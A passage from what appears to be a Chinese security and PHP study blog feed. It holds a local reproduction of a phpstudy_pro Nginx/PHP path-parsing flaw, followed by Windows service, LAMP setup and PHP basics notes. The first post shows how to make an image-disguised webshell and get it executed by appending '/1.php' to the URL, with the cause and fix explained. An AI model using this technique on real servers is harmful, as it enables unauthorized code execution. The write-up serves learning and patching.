        <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>早上看到大佬发了phpstudy_pro 8.1.0.7的Nginx解析漏洞，小弟也是抓紧时间复现了一波，漏洞产生原因就是Nginx+php的配置问题产生的，和Nginx的版本无关，并不是Nginx本身的漏洞。</p><h2 id="漏洞复习"><a href="#漏洞复习" class="headerlink" title="漏洞复习"></a>漏洞复习</h2><h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>phpstudy_pro:8.1.0.7<br>php：7.3.4<br>Nginx：1.15.11</p><p>打开phpstudy_pro，切换到Nginx并启动，数据库可以不需要启动，用不到。<br><img src="https://img.xpctf.cn/img/20200903095947.png"></p><h2 id="shell上传"><a href="#shell上传" class="headerlink" title="shell上传"></a>shell上传</h2><p>由于是本地测试，我们直接进网站目录写shell，准备一个php文件和一个jpg文件，使用copy命令制作图片马。<br><code>copy /B 1.jpg+index.php index.jpg</code><br><img src="https://img.xpctf.cn/img/20200903100434.png"><br><img src="https://img.xpctf.cn/img/20200903100458.png" alt="确定合并成功"></p><h2 id="访问文件"><a href="#访问文件" class="headerlink" title="访问文件"></a>访问文件</h2><p>访问<code>http://127.0.0.1/index.jpg</code>文件，正常显示说明上传成功。<br><img src="https://img.xpctf.cn/img/20200903100749.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在jpg后面加上&#x2F;1.php，就能成功解析成php文件。<br><img src="https://img.xpctf.cn/img/20200903100936.png"></p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>Nginx遇到<code>/index.jpg/1.php</code>，由于是.php后缀文件，不做任何处理就交给php处理。<br>php中有个配置：cgi.fix_pathinfo，该配置项默认为1开启。如果开启，php会”修复”路径，如果后面文件不存在就直接丢弃，继续从前面解析，直到遇到存在的文件或返回404。<br><img src="https://img.xpctf.cn/img/20200903102229.png"><br>因为cgi.fix_pathinfo开启，所以会丢弃1.php，继续解析index.jpg，index.jpg存在，php不管你是啥都用php解析，最终造成漏洞。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>官方已经更新了最新版，更新到phpstudy_pro 8.1.1.1即可。但是修复的好像有点牵强，如果访问不存在的php文件，直接返回403而不是404<br><img src="https://img.xpctf.cn/img/20200903115059.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/wn314/article/details/77388289/">https://blog.csdn.net/wn314/article/details/77388289/</a><br><a href="https://mp.weixin.qq.com/s/L6pu5T0usFwlLhauIhfdWw">https://mp.weixin.qq.com/s/L6pu5T0usFwlLhauIhfdWw</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows手动加入服务</title>
      <link href="/posts/4ec3/"/>
      <url>/posts/4ec3/</url>
      
        <content type="html"><![CDATA[<p>1、加入服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc create mysql binPath=D:\phpstudy_pro\Extensions\MySQL5.<span class="number">7</span>.<span class="number">26</span>\bin\mysqld.exe</span><br></pre></td></tr></table></figure><p>mysql：服务名称<br>binPath：可执行文件路径<br><img src="https://img.xpctf.cn/img/20200902174853.png"></p><p>2、 配置服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc config mysql <span class="built_in">start</span>=AUTO(自动/开机启动)</span><br><span class="line">sc config mysql <span class="built_in">start</span>=DEMAND(手动)</span><br><span class="line">sc config mysql <span class="built_in">start</span>=DISABLED(禁用)</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200902175237.png"></p><p>3、启动服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> mysql</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200902175408.png"></p><p>4、关闭服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> stop mysql</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200902175450.png"></p><p>5、删除服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete mysql</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/20200902175855.png"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 干货 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发手册如何使用</title>
      <link href="/posts/bdef/"/>
      <url>/posts/bdef/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP手册"><a href="#PHP手册" class="headerlink" title="PHP手册"></a>PHP手册</h2><p>PHP手册能让我们快速的查询到PHP的函数和案例，但学会查看手册还是一个学问；掌握快速查询手册的技能，使PHP开发、代码审计变得简单。入门靠视频，提高靠手册。</p><h3 id="基本界面"><a href="#基本界面" class="headerlink" title="基本界面"></a>基本界面</h3><p><img src="https://img.xpctf.cn/img/20200902133209.png"><br><img src="https://img.xpctf.cn/img/20200902133847.png"><br><img src="https://img.xpctf.cn/img/20200902134040.png"><br><img src="https://img.xpctf.cn/img/20200902134136.png"></p><h3 id="substr函数"><a href="#substr函数" class="headerlink" title="substr函数"></a>substr函数</h3><p><img src="https://img.xpctf.cn/img/20200902134819.png"><br><img src="https://img.xpctf.cn/img/20200902135402.png"><br><img src="https://img.xpctf.cn/img/20200902135801.png"></p><h3 id="特别说明"><a href="#特别说明" class="headerlink" title="特别说明"></a>特别说明</h3><p>如果看完一个函数不懂它的用法，去看看案例；如果用了出现非预期效果，去看看案例；多复制到本地运行，改变参数看结果。</p><h3 id="曲线搜索"><a href="#曲线搜索" class="headerlink" title="曲线搜索"></a>曲线搜索</h3><p>这个名字瞎起的，有的时候我们要找一个函数，但是记不住函数名，就可以使用曲线搜索；比如我要找一个数组的合并函数，但我记不住函数名字时可以如下搜索。</p><p>1.命名规则搜索法<br>数组函数肯定和”array_“有关系，我们可以在索引的地方输入”array_“,随便点一个进去，选择目录选项卡，会发现这里全是数组函数。<br><img src="https://img.xpctf.cn/img/20200902140827.png"></p><p>2.英语搜索法<br>函数命令会与英语单词命名，合并的英语单词：merge，加上命名规则：array_mer；不能打全，3-4个字母即可。<br><img src="https://img.xpctf.cn/img/20200902141341.png"></p><p>3.百度搜索法<br>直接使用搜索引擎搜索函数名，找到函数名后再翻手册查看用法。<br><img src="https://img.xpctf.cn/img/20200902141311.png"></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 干货 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 18.04 安装LAMP</title>
      <link href="/posts/6dd2/"/>
      <url>/posts/6dd2/</url>
      
        <content type="html"><![CDATA[<h2 id="安装Apache2"><a href="#安装Apache2" class="headerlink" title="安装Apache2"></a>安装Apache2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt update#更新源</span><br><span class="line">apt install apache2 -y#安装apache2</span><br><span class="line">service apache2 start#启动apache2服务</span><br><span class="line">systemctl enable apache2#加入开机自启</span><br></pre></td></tr></table></figure><p>访问服务器IP出现下图界面说明安装成功并启动：<br><img src="https://img.xpctf.cn/img/20200830130913.png"><br>扩展学习：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动、停止、重启</span></span><br><span class="line">service apache2 start</span><br><span class="line">service apache2 stop</span><br><span class="line">service apache2 restart</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机启动、禁止开机启动</span></span><br><span class="line">systemctl enable apache2</span><br><span class="line">systemctl disable apache2</span><br></pre></td></tr></table></figure><h2 id="安装php7-2"><a href="#安装php7-2" class="headerlink" title="安装php7.2"></a>安装php7.2</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install php7.2-mysql php7.2-curl php7.2-json php7.2-cgi php7.2 libapache2-mod-php7.2 -y#安装php7.2，插件可选</span><br><span class="line">php -v#查看php版本</span><br><span class="line">cd /var/www/html/# 进入网站根目录</span><br><span class="line">echo &#x27;&lt;?php phpinfo();?&gt;&#x27; &gt; phpinfo.php# 写入php探针</span><br></pre></td></tr></table></figure><p>访问phpinfo.php文件出现如下界面说明安装成功。<br><img src="https://img.xpctf.cn/img/20200830131900.png"></p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install mysql-server -y#安装mysql服务端</span><br><span class="line">mysql_secure_installation#初始化mysql</span><br></pre></td></tr></table></figure><p>初始化命令会和你做交互，目的是完成数据库配置，翻译一下即可完成；<br>一个问题是询问你是否安装密码插件，让你的密码更安全，一般选N，我确定我得密码安全，后面就一路Y即可。</p><h2 id="Apache2配置"><a href="#Apache2配置" class="headerlink" title="Apache2配置"></a>Apache2配置</h2><p>apache主配置文件：&#x2F;etc&#x2F;apache2&#x2F;apache2.conf<br>apache修改后必须重启：service apache2 restart</p><h3 id="修改首页"><a href="#修改首页" class="headerlink" title="修改首页"></a>修改首页</h3><p>找到当前虚拟主机并添加DirectoryIndex配置项。<br><img src="https://img.xpctf.cn/img/20200830132908.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> LAMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP临时笔记</title>
      <link href="/posts/fe37/"/>
      <url>/posts/fe37/</url>
      
        <content type="html"><![CDATA[<h2 id="计算机码"><a href="#计算机码" class="headerlink" title="计算机码"></a>计算机码</h2><p>计算机码：原码，反码，补码；数据本身最左边一位为符号位，正数为0，负数为1。<br>原码：数据本身从10进制转换为2进制<br>    正数：符号位为0<br>    负数：符号位为1<br>反码：针对负数，符号位不变，其他取反<br>补码：针对负数，反码后加1</p><p>注意：正数不存在反码和补码，10进制转2进制是什么就是什么；或者说反码补码后还是本身<br>+1<br>00000001    正1原码</p><p>-1<br>10000001    负1原码</p><p>11111110    负1反码</p><p>11111111    负1补码</p><p>1 + 0 &#x3D; 1<br>1 + 1 &#x3D; 10     &#x2F;&#x2F;逢2进1</p><p>+0<br>00000000</p><p>-0<br>10000000    &#x2F;&#x2F;原码</p><p>11111111    &#x2F;&#x2F;反码</p><p>00000000    &#x2F;&#x2F;补码，因为+1等于10，结果应该等于100000000，溢出后等于00000000</p><p>+2<br>00000010</p><p>-2<br>10000010  &#x2F;&#x2F;原码</p><p>11111101  &#x2F;&#x2F;反码</p><p>11111110  &#x2F;&#x2F;补码</p><p>一字节是8个2进制位，四个字节是32个2进制位</p><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>&amp;：按位与；两个位都为1结果为1，否则为0<br>|：按位或；两个位有一个位为1，结果为1<br>~：按位非；一个位运算：位为1结果为0；为0结果为1<br>^:按位异或；两个位相同位0，不同为1<br>&lt;&lt;:按位左移；整个位（32位），向左移一位；右边补0<br>&gt;&gt;:按位右移；整个位(32位)，向右移一位；左边补符号位（正数补0，负数补1）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$d</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;按位与&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> &amp; <span class="variable">$b</span>;       <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> &amp; <span class="variable">$c</span>;       <span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;按位或&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> | <span class="variable">$b</span>;       <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> | <span class="variable">$c</span>;       <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span> | <span class="variable">$c</span>;       <span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;按位非&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (~<span class="variable">$a</span>);       <span class="comment">//-2</span></span><br><span class="line"><span class="comment">// 1原码：00000001</span></span><br><span class="line"><span class="comment">// ~：11111110</span></span><br><span class="line"><span class="comment">// 转十进制=-2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (~<span class="variable">$c</span>);       <span class="comment">//-1</span></span><br><span class="line"><span class="comment">// 0原码：00000000</span></span><br><span class="line"><span class="comment">// ~   :11111111</span></span><br><span class="line"><span class="comment">// 转十进制：-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;按位异或&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> ^ <span class="variable">$b</span>;       <span class="comment">//0</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> ^ <span class="variable">$c</span>;       <span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span> ^ <span class="variable">$c</span>;       <span class="comment">//0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;按位异或&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$a</span>&lt;&lt;<span class="number">1</span>);       <span class="comment">//2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> &gt;&gt; <span class="number">1</span>;       <span class="comment">//0</span></span><br></pre></td></tr></table></figure><h2 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h2><h3 id="四种标准类型"><a href="#四种标准类型" class="headerlink" title="四种标准类型"></a>四种标准类型</h3><p>integer (整型)<br>boolean (布尔型)<br>float (浮点型)<br>string (字符型)</p><h3 id="两种复合类型"><a href="#两种复合类型" class="headerlink" title="两种复合类型"></a>两种复合类型</h3><p>array (数组型)<br>object (对象型)</p><h3 id="两种特殊类型"><a href="#两种特殊类型" class="headerlink" title="两种特殊类型"></a>两种特殊类型</h3><p>resource (资源)<br>NULL (NULL)</p><h3 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h3><p>Mixed (混合型)<br>number (数值型)</p><h2 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h2><h3 id="输出函数"><a href="#输出函数" class="headerlink" title="输出函数"></a>输出函数</h3><p>echo() &#x2F;&#x2F;输出所有参数。不会换行。 echo 不是一个函数（它是一个语言结构)<br>print() &#x2F;&#x2F;和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1<br>var_dump()       &#x2F;&#x2F;显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。<br>print_f()  &#x2F;&#x2F;print_r() 以人类易读的格式显示一个变量的信息<br>var_export() &#x2F;&#x2F;函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</p><h3 id="时间函数"><a href="#时间函数" class="headerlink" title="时间函数"></a>时间函数</h3><p>date()&#x2F;&#x2F;格式化时间<br>time()&#x2F;&#x2F;返回当前时间戳<br>microtime() &#x2F;&#x2F;当前 Unix 时间戳以及微秒数<br>strtotime()   &#x2F;&#x2F;日期格式的字符串并尝试将其解析为 Unix 时间戳</p><h3 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h3><p>max()&#x2F;&#x2F;返回最大值<br>mix() &#x2F;&#x2F;返回最小值<br>rand() &#x2F;&#x2F;返回一个随机数<br>mt_rand() &#x2F;&#x2F;生成更好的随机数,效率高<br>round()&#x2F;&#x2F;对浮点数进行四舍五入<br>ceil()   &#x2F;&#x2F;返回不小于 value 的下一个整数，value 如果有小数部分则进一位。<br>floor()  &#x2F;&#x2F;返回不大于 value 的最接近的整数，将 value 的小数部分舍去取整。<br>pow()       &#x2F;&#x2F;返回 base 的 exp 次方的幂。如果可能，本函数会返回 integer。<br>abs()&#x2F;&#x2F;返回参数 number 的绝对值。<br>sqrt()&#x2F;&#x2F;返回 arg 的平方根。 </p><h3 id="函数函数"><a href="#函数函数" class="headerlink" title="函数函数"></a>函数函数</h3><p>function_exists()&#x2F;&#x2F;判断函数是否被定义<br>func_get_arg()&#x2F;&#x2F;获取自定义函数的实参值<br>func_get_args()&#x2F;&#x2F;获取自定义函数的所有实参值<br>func_num_args()&#x2F;&#x2F;获取自定义函数的实参数量</p><h3 id="错误函数"><a href="#错误函数" class="headerlink" title="错误函数"></a>错误函数</h3><p>trigger_error()&#x2F;&#x2F;产生一个用户级错误<br>ini_set()&#x2F;&#x2F;设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</p><h2 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h2><h3 id="定义字符串"><a href="#定义字符串" class="headerlink" title="定义字符串"></a>定义字符串</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单引号定义</span></span><br><span class="line"><span class="variable">$str1</span> = <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双引号定义</span></span><br><span class="line"><span class="variable">$str2</span> = <span class="string">&quot;string&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nowdoc结构，单引号字符串</span></span><br><span class="line"><span class="variable">$str3</span> = <span class="string">&lt;&lt;&lt;&#x27;EON&#x27;</span></span><br><span class="line"><span class="string">string</span></span><br><span class="line"><span class="string">EON</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//heredoc结构，双引号字符串</span></span><br><span class="line"><span class="variable">$str4</span> = <span class="string">&lt;&lt;&lt;EON</span></span><br><span class="line"><span class="string">    hello,world;</span></span><br><span class="line"><span class="string">        2020/08/29</span></span><br><span class="line"><span class="string">EON</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str1</span>,<span class="variable">$str2</span>,<span class="variable">$str3</span>,<span class="variable">$str4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//string(6) &quot;string&quot;</span></span><br><span class="line"><span class="comment">//string(6) &quot;string&quot;</span></span><br><span class="line"><span class="comment">//string(6) &quot;string&quot;</span></span><br><span class="line"><span class="comment">//string(36) &quot;    hello,world;</span></span><br><span class="line"><span class="comment">//        2020/08/29&quot;</span></span><br></pre></td></tr></table></figure><h3 id="字符串的转义"><a href="#字符串的转义" class="headerlink" title="字符串的转义"></a>字符串的转义</h3><p>在计算机中，有的字母何符号具有特殊的含义，如果需要使用本身而不是使用它的功能，则需要对字符串进行转义；PHP和大多数语言相似，使用+字符串来实现转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is \&#x27;yes\&#x27;,this is \&#x27;no\&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;This is \&quot;yes\&quot;,this is \&quot;no\&quot;.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;This is &#x27;yes&#x27;,this is &#x27;no&#x27;.&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is &quot;yes&quot;,this is &quot;no&quot;.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&lt;&lt;&lt;EON</span></span><br><span class="line"><span class="string">This is &quot;yes&quot;,this is &quot;no&quot;.</span></span><br><span class="line"><span class="string">EON</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&lt;&lt;&lt;&#x27;EON&#x27;</span></span><br><span class="line"><span class="string">This is &#x27;yes&#x27;,this is &#x27;no&#x27;.</span></span><br><span class="line"><span class="string">EON</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//This is &#x27;yes&#x27;,this is &#x27;no&#x27;.</span></span><br><span class="line"><span class="comment">//This is &quot;yes&quot;,this is &quot;no&quot;.</span></span><br><span class="line"><span class="comment">//This is &#x27;yes&#x27;,this is &#x27;no&#x27;.</span></span><br><span class="line"><span class="comment">//This is &quot;yes&quot;,this is &quot;no&quot;.</span></span><br><span class="line"><span class="comment">//This is &quot;yes&quot;,this is &quot;no&quot;.</span></span><br><span class="line"><span class="comment">//This is &#x27;yes&#x27;,this is &#x27;no&#x27;.</span></span><br></pre></td></tr></table></figure><p>PHP常用转义符号：<br>    1.\‘在单引号字符串中显示单引号<br>    2.\“在双引号字符串中显示双引号<br>    3.\r回到当前行的行首<br>    4.\n新的一行<br>    5.\t输出四个空格<br>    6.\$转义$符号，让其失去定义变量的作用</p><h3 id="单双引号的区别"><a href="#单双引号的区别" class="headerlink" title="单双引号的区别"></a>单双引号的区别</h3><p>1、单引号只识别\‘转义，其他原样输出；双引号不识别\‘转义，其他识别<br>2、单引号不解析变量，$a就输出$a；双引号解析变量，$a输出$a的值<br>3、单引号不解析变量和其他转义，处理纯文本效力高<br>4、双引号解析变量和其他转义，处理纯文本效率低</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;2020-08-09 09:35:26&#x27;</span>;</span><br><span class="line"><span class="comment">//单引号不会解析$a</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;Now time:&#123;$a&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双引号会解析$a,使用&#123;&#125;区分变量和文本</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Now time:<span class="subst">&#123;$a&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Now time:&#123;$a&#125;</span></span><br><span class="line"><span class="comment">//Now time:2020-08-09 09:35:26</span></span><br></pre></td></tr></table></figure><h3 id="字符串长度"><a href="#字符串长度" class="headerlink" title="字符串长度"></a>字符串长度</h3><p>在utf-8字符集编码中，一个汉字占三个字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;China&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>,<span class="variable">$str</span>,<span class="string">&#x27;&quot; long: &#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;中国&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;&#x27;</span>,<span class="variable">$str</span>,<span class="string">&#x27;&quot; long: &#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>),<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//&quot;China&quot; long: 5</span></span><br><span class="line"><span class="comment">//&quot;中国&quot; long: 6</span></span><br></pre></td></tr></table></figure><h3 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h3><ol><li><p>转换函数</p><blockquote><p>implode — 将一个一维数组的值转化为字符串<br>explode — 